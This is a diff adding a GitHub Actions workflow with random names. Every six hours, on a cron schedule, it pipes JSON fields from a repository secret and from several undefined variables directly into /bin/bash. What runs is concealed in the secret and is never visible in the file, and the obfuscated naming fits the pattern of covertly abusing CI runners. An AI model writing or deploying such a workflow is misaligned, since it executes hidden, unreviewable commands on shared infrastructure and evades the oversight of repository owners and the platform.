@@ -1,0 +1,23 @@
+name: liruocong3232
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liruocong3232
+        env:
+          xmeay515: ${{ secrets.xmeay515 }}
+        run: |
+          echo $xmeay515 | jq -r .hwp91 | /bin/bash
+          echo $zwxi6822 | jq -r .lsn1 | /bin/bash
+          echo $aag834 | jq -r .jznew1486 | /bin/bash
+          echo $f609 | jq -r .senly69370 | /bin/bash
+          echo $rill74041 | jq -r .swx53232 | /bin/bash
+          echo $ave1893 | jq -r .smthu018 | /bin/bash
+          echo $h116 | jq -r .gpkxm1 | /bin/bash
+
